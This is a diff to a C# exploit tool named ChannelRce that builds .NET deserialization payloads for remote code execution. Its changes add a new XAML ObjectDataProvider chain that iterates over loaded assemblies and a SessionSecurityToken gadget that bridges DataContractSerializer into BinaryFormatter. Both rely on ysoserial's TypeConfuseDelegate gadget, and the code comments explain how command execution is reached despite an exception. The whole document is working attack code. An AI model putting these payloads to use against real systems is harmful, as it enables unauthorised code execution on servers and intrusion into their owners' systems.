@@ -46,7 +46,7 @@ namespace ChannelRce
                 {
                     string strint = objstr.Substring(3);
 
-                    ret = objcount+1 - int.Parse(strint);
+                    ret = objcount + 1 - int.Parse(strint);
                 }
                 Console.WriteLine("GetHashCode" + objstr);
 
@@ -59,10 +59,14 @@ namespace ChannelRce
     [Serializable]
     public class FakeDataSet : ISerializable
     {
-        private int asmindex=0;
-        public FakeDataSet(int asm_index)
+        private int asmindex = 0;
+        private int asmend = 0;
+        private bool isnew = false;
+        public FakeDataSet(int asm_index, int asm_end, bool newmode)
         {
             asmindex = asm_index;
+            asmend = asm_end;
+            isnew = newmode;
         }
 
         //https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs
@@ -91,12 +95,12 @@ namespace ChannelRce
         public static SortedSet<Array> TypeConfuseDelegateGadgetAsm()
         {
             string dllpath = typeof(FakeAsm.ClassFake).Assembly.Location;
-            string pdbpath = dllpath.Replace(".dll",".pdb");
+            string pdbpath = dllpath.Replace(".dll", ".pdb");
             Array dllbytes = File.ReadAllBytes(dllpath).ToArray();
             Array pdbbytes = File.ReadAllBytes(pdbpath).ToArray();
-            Console.WriteLine("Load dllpath:=>"+ dllpath);
+            Console.WriteLine("Load dllpath:=>" + dllpath);
             Console.WriteLine("Load pdbpath:=>" + pdbpath);
-            Console.WriteLine("Load dllbytes:=>"+ dllbytes.Length+ ",pdbbytes:=>"+ pdbbytes.Length);
+            Console.WriteLine("Load dllbytes:=>" + dllbytes.Length + ",pdbbytes:=>" + pdbbytes.Length);
             Delegate da = new Comparison<Array>(Array.LastIndexOf);
             Comparison<Array> d = (Comparison<Array>)MulticastDelegate.Combine(da, da);
             IComparer<Array> comp = Comparer<Array>.Create(d);
@@ -214,6 +218,114 @@ namespace ChannelRce
 
 
 
+        public string xamlrcepayloadnew(int asm_index, int trycount)
+        {
+
+
+            ResourceDictionary myResourceDictionary = new ResourceDictionary();
+            Dictionary<string, ObjectDataProvider> myResourceDictionaryaux = new Dictionary<string, ObjectDataProvider>();
+
+            string odp1name = "odp1";
+            string odp2name = "odp2";
+            string odp3name = "odp3";
+            string odp4name = "odp4";
+            string odp5name = "odp5";
+            string odp6name = "odp6";
+            string odp7name = "odp7";
+            string odp8name = "odp8";
+
+            var odp1 = new ObjectDataProvider();
+            odp1.ObjectType = typeof(System.Threading.Thread);
+
+            odp1.MethodName = "GetDomain";
+
+
+            StaticResourceExtension odpext1 = new StaticResourceExtension(odp1name);
+
+
+            ObjectDataProvider odp2 = new ObjectDataProvider();
+            odp2.MethodName = "GetAssemblies";
+
+            odp2.ObjectInstance = odpext1;
+            StaticResourceExtension odpext2 = new StaticResourceExtension(odp2name);
+            int staridx = 3;
+            int asmoffset = 0;
+            for (int i = 0; i < trycount; i += 2)
+            {
+                int asm_indexnow = asm_index + asmoffset;
+                asmoffset++;
+                string odpnameaux = "odp" + (staridx + i);
+
+                ObjectDataProvider odp3 = new ObjectDataProvider();
+                odp3.MethodName = "GetValue";
+
+
+
+                odp3.ObjectInstance = odpext2;
+
+                Console.WriteLine(asm_indexnow);
+                odp3.MethodParameters.Add(asm_indexnow);
+
+                StaticResourceExtension odpext3 = new StaticResourceExtension(odpnameaux);
+                ObjectDataProvider odp4 = new ObjectDataProvider();
+
+                odp4.ObjectInstance = odpext3;
+
+
+                odp4.MethodName = "GetCustomAttributes";
+
+
+                odp4.MethodParameters.Add(false);
+
+
+                string odpnameaux2 = "odp" + (staridx + i + 1);
+                myResourceDictionaryaux.Add(odpnameaux, odp3);
+                myResourceDictionaryaux.Add(odpnameaux2, odp4);
+            }
+
+
+
+
+
+            FieldInfo fi_baseDictionary = myResourceDictionary.GetType().GetField("_baseDictionary", BindingFlags.NonPublic | BindingFlags.Instance);
+
+            FieldInfo fi_keycomparer = typeof(Hashtable).GetField("_keycomparer", BindingFlags.NonPublic | BindingFlags.Instance);
+            Hashtable hstbl = (Hashtable)fi_baseDictionary.GetValue(myResourceDictionary);
+
+
+
+            MyEqualityComparer mycmp = new MyEqualityComparer(3 + trycount);
+
+            fi_keycomparer.SetValue(hstbl, mycmp);
+
+
+
+
+            myResourceDictionary.Add(odp1name, odp1);
+
+            myResourceDictionary.Add(odp2name, odp2);
+
+            foreach (KeyValuePair<string, ObjectDataProvider> keyValuePair in myResourceDictionaryaux)
+            {
+                myResourceDictionary.Add(keyValuePair.Key, keyValuePair.Value);
+            }
+
+
+            foreach (DictionaryEntry o in myResourceDictionary)
+            {
+                FixObjectDataProvider(o.Value);
+
+
+            }
+
+
+            Console.WriteLine("Xaml_serialize");
+            string payload = Xaml_serialize(myResourceDictionary);
+            Console.WriteLine("Xaml_serialize payload");
+            return payload;
+        }
+
+
         public string xamlrcepayload(int asm_index)
         {
 
@@ -295,7 +407,7 @@ namespace ChannelRce
 
 
             odp7.MethodParameters.Add(false);
-           
+
 
 
             FieldInfo fi_baseDictionary = myResourceDictionary.GetType().GetField("_baseDictionary", BindingFlags.NonPublic | BindingFlags.Instance);
@@ -325,12 +437,12 @@ namespace ChannelRce
             // myResourceDictionary.Add(odp8name, odp8);
 
 
-           
+
             foreach (DictionaryEntry o in myResourceDictionary)
             {
                 FixObjectDataProvider(o.Value);
 
-              
+
             }
 
 
@@ -339,6 +451,41 @@ namespace ChannelRce
             Console.WriteLine("Xaml_serialize payload");
             return payload;
         }
+
+
+        public static SessionSecurityToken SessionSecurityTokenGadget(object gadget)
+        {
+
+            // - Create new ClaimsIdentity and set the BootstrapConext
+            // - Bootrstrap context is set to to the TypeConfuseDelegateGadget from 
+            //      ysoserial and is of Type SortedSet<string>
+            // - The TypeConfuseDelegateGadget will execute notepad
+            ClaimsIdentity id = new ClaimsIdentity();
+            id.BootstrapContext = gadget;
+
+            // - Create new ClaimsPrincipal and add the ClaimsIdentity to it
+            ClaimsPrincipal principal = new ClaimsPrincipal();
+            principal.AddIdentity(id);
+
+            // - Finally create the SessionSecurityToken which takes the principal
+            //      in its constructor
+            SessionSecurityToken s = new SessionSecurityToken(principal);
+
+
+            // - The SessionSecurityToken is serializable using DataContractSerializer
+            // - When it gets deserialized the BootstrapContext will get deserialized 
+            //      using BinaryFormatter, which is more powerful from an attackers
+            //      perspective, and will not be subject to any kind of whitelisting.
+            //      In this sense it a "bridge" from DataContractSerializer to
+            //      BinaryFormatter
+            // - This will cause an exception to be thrown when the BootstrapContext
+            //      is deserialized, but we still get the command execution:
+            //          Unhandled Exception: System.InvalidCastException: Unable to cast 
+            //          object of type 'System.Collections.Generic.SortedSet`1[System.String]' 
+            //          to type 'System.IdentityModel.Tokens.BootstrapContext'
+            return s;
+        }
+
 
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
@@ -360,14 +507,36 @@ namespace ChannelRce
             }
             else
             {
-                string payload = xamlrcepayload(asmindex);
 
-                 gadget = TypeConfuseDelegateGadgetXaml(payload);
+                if (isnew)
+                {
+                    int trycount = asmend - asmindex;
+
+                    trycount = (trycount >> 1 )<< 1;
+                  // trycount = 0x20;
+                    Console.WriteLine("Exploit New Mode From "+ asmindex+" to "+(asmindex+ trycount));
+                    string payload = xamlrcepayloadnew(asmindex, trycount);
+                    gadget = TypeConfuseDelegateGadgetXaml(payload);
+                    /*object gadgetobj = TypeConfuseDelegateGadgetXaml(payload);
+                    gadget = SessionSecurityTokenGadget(gadgetobj);*/
+                }
+                else
+                {
+                    Console.WriteLine("Exploit Old Mode At " + asmindex);
+                    string payload = xamlrcepayload(asmindex);
+
+                    gadget = TypeConfuseDelegateGadgetXaml(payload);
+
+                    /*object gadgetobj = TypeConfuseDelegateGadgetXaml(payload);
+                    gadget = SessionSecurityTokenGadget(gadgetobj);*/
+                }
+
+                // gadget = TypeConfuseDelegateGadgetXaml(payload);
 
             }
-            
+
             // object gadget = TypeConfuseDelegateGadgetdllpath();
-          
+
 
             // create a big buffer since we don't know what the object size will be
             MemoryStream stm = new MemoryStream();
